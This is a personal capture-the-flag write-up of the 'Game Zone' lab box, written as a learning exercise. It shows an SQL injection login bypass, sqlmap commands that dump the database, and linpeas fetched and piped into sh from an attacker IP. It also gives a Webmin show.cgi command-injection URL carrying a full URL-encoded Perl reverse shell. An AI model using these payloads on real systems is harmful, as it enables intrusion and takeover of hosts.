---
title: "Game Zone"
tags:
- writeups
---

## Recon
![[write-ups/images/Pasted image 20220821112327.png]]

First noticed that `httpd` was not running the latest version `2.4.54` & was using `2.4.18`, but didn't find [anything of value](https://www.cvedetails.com/vulnerability-list.php?vendor_id=45&product_id=66&version_id=553326&page=1&hasexp=0&opdos=0&opec=0&opov=0&opcsrf=0&opgpriv=0&opsqli=0&opxss=0&opdirt=0&opmemc=0&ophttprs=0&opbyp=0&opfileinc=0&opginf=0&cvssscoremin=0&cvssscoremax=0&year=0&cweid=0&order=1&trc=9&sha=4cda1da0c8c880d878436cb54f5ee0d53877947a) there. So I went to the web server

## Getting user with sqli
![[write-ups/images/Pasted image 20220821112636.png]]
Looks like of those hitman websites on Tor 😶‍🌫️. Besides some login & search functionality it doesn't seem we have much to work with here. Gobuster found `/images` & `/server-status`, but the latter one just gave us a [403 forbidden access](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/403). Now I could've started to look for a bypass, but decided to play with the login @ first for a bit since it was more spicy.

By supplying a basic payload in the username field: `' or 1=1-- -` we're redirected to `/portal.php`. Good we have [[sqli]]
![[write-ups/images/Pasted image 20220821113342.png]]
Here we can search for game reviews, since the login was vulnerable maybe this is too 😋
![[write-ups/images/Pasted image 20220821113843.png]]
Well... something happened. I guess based on the error thrown that we need a double qoute instead of a single one
![[write-ups/images/Pasted image 20220821114234.png]]
But I got nothing... Thus I went to a more reliable friend [sqlmap](https://sqlmap.org/). I saved the `POST` request to `portal.php` into a file from Burp *(`right-click -> Copy to file`)* & ran 
```bash
sqlmap -r `pwd`/portalReq.txt --dbms=mysql --dump
# OR without the request file
sqlmap -u "http://10.10.66.82/portal.php" --data "searchitem=test" -p "searchitem" --method POST
```
Which got me this
![[write-ups/images/Pasted image 20220821115407.png]]

Supplying the hash to [crackstation](https://crackstation.net/) has done the job for me
![[write-ups/images/Pasted image 20220821115524.png]]

What remains is to ssh... and we're in

![[write-ups/images/Pasted image 20220821115630.png]]


## Privesc
First things first I ran [linpeas.sh](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) in memory: `curl http://10.18.12.227:8001/linpeas.sh | sh`
- based on the old version of `sudo` I thought I might find some public exploit & I did, even multiple ones. Tried [pwfeedback Buffer Overflow](https://www.exploit-db.com/exploits/48052) and a [Heap-Based Buffer Overflow Privilege Escalation](https://www.exploit-db.com/exploits/49521) but without success
- we see some new active ports on `10000` and `3306`, for the moment I just took a mind-note about it
	- ![[write-ups/images/Pasted image 20220821122143.png]]
- it permits root login on `ssh`
- tried to abuse [[SUID files]] on `at` & `pkexec` but failed
In the end I went back to the new exposed services. But how can I see what are they serving. [[SSH Tunneling]] is here for rescue 🦸. We can tunnel both services through `ssh` to reach them from our localhost like this:
```bash
ssh -L 10000:localhost:10000 agent47@10.10.66.82
ssh -L 3306:localhost:3306 agent47@10.10.66.82
```
Once we go to `http://localhost:10000/` we see [Webmin](https://webmin.com/) running: *"web-based interface for system administration for Unix. Using any modern web browser, you can setup user accounts, Apache, DNS, file sharing and much more"*
![[write-ups/images/Pasted image 20220821123827.png]]

I tried to login as `agent47` with our known password & it just worked
![[write-ups/images/Pasted image 20220821123912.png]]


If we look @ the source we can find the version
![[write-ups/images/Pasted image 20220821124254.png]]

Finding around the interwebs I found this [RCE through /file/show.cgi](https://www.exploit-db.com/exploits/21851). So let's take a look at the metasploit module because we want to do things manually right 🫠?
- first it attempts to login with the supplied credentials
	- ![[write-ups/images/Pasted image 20220821132200.png]]
- then it sends a `GET` request @ `/file/show.cgi/bin/<random_char>|#<cmd>|` & sets the cookie
	- ![[write-ups/images/Pasted image 20220821132347.png]]
- since we're already logged in let's see if we can get a `ping` back with the following payload: `http://localhost:10000/file/show.cgi/show.cgi/bin/A/%7Cping -c 3 10.18.12.227%7C` *(i just added `A` as the random char & added my cmd: `ping -c 3 <ip>`, then url-encode)*
	- ![[write-ups/images/Pasted image 20220821132536.png]]
- and we got it 🥳 so let's spawn a shell. I tried all different kind of reverse shells until whaat worked for me was the [Perl one](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Reverse Shell Cheatsheet.md#perl) url-encoded with [this website](https://www.urlencoder.io/)
	- `http://localhost:10000/file/show.cgi/show.cgi/bin/A/%7Cperl -e %27use Socket%3B%24i%3D%2210.18.12.227%22%3B%24p%3D1337%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fbash -i%22%29%3B%7D%3B%27%7C`
	- ![[write-ups/images/Pasted image 20220821133831.png]]

## See Also
- [[write-ups/THM]]